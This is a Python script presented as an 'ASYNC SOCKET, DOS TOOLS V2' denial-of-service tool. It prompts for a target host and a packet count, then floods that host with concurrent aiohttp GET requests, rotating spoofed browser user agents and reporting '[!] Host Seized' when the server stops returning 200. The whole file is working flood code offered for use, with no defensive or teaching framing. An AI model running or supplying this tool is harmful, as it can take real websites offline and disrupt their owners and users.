import time
import asyncio
import aiohttp
import colorama 
from colorama import Fore
from colorama import Style
from fake_useragent import UserAgent

colorama.init()

# update target
def banner():
	print(Fore.RED + ''' 
.▄▄ ·  ▄· ▄▌ ▐ ▄  ▄▄·     .▄▄ ·        ▄▄· ▄ •▄ ▄▄▄ .▄▄▄▄▄
▐█ ▀. ▐█▪██▌•█▌▐█▐█ ▌▪    ▐█ ▀. ▪     ▐█ ▌▪█▌▄▌▪▀▄.▀·•██  
▄▀▀▀█▄▐█▌▐█▪▐█▐▐▌██ ▄▄    ▄▀▀▀█▄ ▄█▀▄ ██ ▄▄▐▀▀▄·▐▀▀▪▄ ▐█.▪
▐█▄▪▐█ ▐█▀·.██▐█▌▐███▌    ▐█▄▪▐█▐█▌.▐▌▐███▌▐█.█▌▐█▄▄▌ ▐█▌·
 ▀▀▀▀   ▀ • ▀▀ █▪·▀▀▀      ▀▀▀▀  ▀█▄▀▪·▀▀▀ ·▀  ▀ ▀▀▀  ▀▀▀ 
       ...:::[ ASYNC SOCKET , DOS TOOLS V2 ]:::...
       ...:::[ Copyright BY Chiens Adams   ]:::... ''' + Style.RESET_ALL)
	print("")

banner()

host = input("Host Target : ")

run = True

user_agents = [
      "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
      "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
      "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
      "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
      "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
      "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
      "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
]

while run:
	async def send_packet(session):
		for user_agent in user_agents:
			headers = {
				"User-Agent": user_agent
			}

			async with session.get(host, headers=headers) as response:
				if response.status == 200:
					print(Fore.GREEN + f'[+] Packet Done : {response.status}')
				else:
					print(Fore.RED + f'[!] Host Seized : {response.status}')

		for user_agent in user_agents:
			headers = {
				"User-Agent": user_agent
			}

			async with session.get(host, headers=headers) as response:
				if response.status == 200:
					print(Fore.GREEN + f'[+] Packet Done : {response.status}')
				else:
					print(Fore.RED + f'[!] Host Seized : {response.status}')
					

	async def main():
		num_packet = int(input("Num Packet : ")) 
		socket = []

		async with aiohttp.ClientSession() as session:
			for i in range(num_packet):
				send_host = asyncio.ensure_future(send_packet(session))
				socket.append(send_host)

			await asyncio.gather(*socket)

	if __name__ == '__main__':
		loopend = asyncio.get_event_loop()
		loopend.run_until_complete(main())
